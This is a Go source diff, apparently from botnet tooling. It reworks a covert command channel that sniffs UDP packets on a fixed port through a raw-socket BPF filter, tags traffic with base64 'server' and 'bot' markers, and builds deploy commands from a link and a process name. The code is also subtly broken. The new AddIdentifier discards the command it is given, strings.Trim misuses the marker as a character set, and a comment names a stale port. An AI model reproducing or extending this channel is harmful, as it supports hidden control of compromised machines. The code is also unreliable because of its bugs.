@@ -24,7 +24,8 @@ import (
 )
 
 // How Packets are Marked
-var IDENTIFIER string
+var ServerIdentifier string = "c2VydmVy"
+var BotIdentifier string = "Ym90Cg"
 
 // FilterRaw is a BPF struct containing raw instructions.
 // Generate with tcpdump udp and port 56969 -dd
@@ -35,9 +36,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x30, 0, 0, 0x00000014},
 	{0x15, 0, 15, 0x00000011},
 	{0x28, 0, 0, 0x00000036},
-	{0x15, 12, 0, 0x0000de89},
+	{0x15, 12, 0, 0x0000e290},
 	{0x28, 0, 0, 0x00000038},
-	{0x15, 10, 11, 0x0000de89},
+	{0x15, 10, 11, 0x0000e290},
 	{0x15, 0, 10, 0x00000800},
 	{0x30, 0, 0, 0x00000017},
 	{0x15, 0, 8, 0x00000011},
@@ -45,9 +46,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x45, 6, 0, 0x00001fff},
 	{0xb1, 0, 0, 0x0000000e},
 	{0x48, 0, 0, 0x0000000e},
-	{0x15, 2, 0, 0x0000de89},
+	{0x15, 2, 0, 0x0000e290},
 	{0x48, 0, 0, 0x00000010},
-	{0x15, 0, 1, 0x0000de89},
+	{0x15, 0, 1, 0x0000e290},
 	{0x6, 0, 0, 0x00040000},
 	{0x6, 0, 0, 0x00000000},
 }
@@ -65,7 +66,7 @@ func htons(i uint16) uint16 {
 	return (i<<8)&0xff00 | i>>8
 }
 
-func BothReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
+func BothReadPacket(fd int, vm *bpf.VM, forServer bool) gopacket.Packet {
 	// Buffer for packet data that is read in
 	buf := make([]byte, 1500)
 
@@ -92,8 +93,14 @@ func BothReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "cHNvdmF5YQ") {
-			return packet
+		if forServer {
+			if strings.Contains(string(packet.ApplicationLayer().Payload()), ServerIdentifier) {
+				return packet
+			}
+		} else {
+			if strings.Contains(string(packet.ApplicationLayer().Payload()), BotIdentifier) {
+				return packet
+			}
 		}
 		return nil
 	}
@@ -449,12 +456,20 @@ func CreateDeploy(link string, pname string) (command string) {
 	return command
 }
 
-func AddIdentifier(cmd string) (command string) {
-	command = IDENTIFIER + cmd
+func AddIdentifier(cmd string, forServer bool) (command string) {
+	if forServer {
+		command = ServerIdentifier + command
+		return command
+	}
+	command = BotIdentifier + command
 	return command
 }
 
-func RemoveIdentifier(data string) (command string) {
-	newData := strings.Trim(data, IDENTIFIER)
+func RemoveIdentifier(data string, forServer bool) (command string) {
+	if forServer {
+		newData := strings.Trim(data, ServerIdentifier)
+		return newData
+	}
+	newData := strings.Trim(data, BotIdentifier)
 	return newData
 }
